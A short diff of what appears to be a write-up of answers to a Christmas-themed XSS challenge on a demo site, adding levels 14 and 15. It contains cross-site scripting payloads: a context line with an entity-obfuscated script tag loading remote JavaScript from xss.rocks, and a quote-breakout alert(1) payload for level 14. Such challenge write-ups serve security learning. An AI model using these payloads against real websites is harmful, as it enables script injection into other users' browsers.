@@ -97,3 +97,13 @@ alternatively one character reference would be enough
 ```
 <script src="h&#116;tps://xss.rocks/xss.js"></script>
 ```
+**+++ Day 14 +++**  
+https://xmass.compass-demo.com/level14
+```
+\";alert(1);//
+```
+**+++ Day 15 +++**  
+https://xmass.compass-demo.com/level15
+```
+tbc
+```
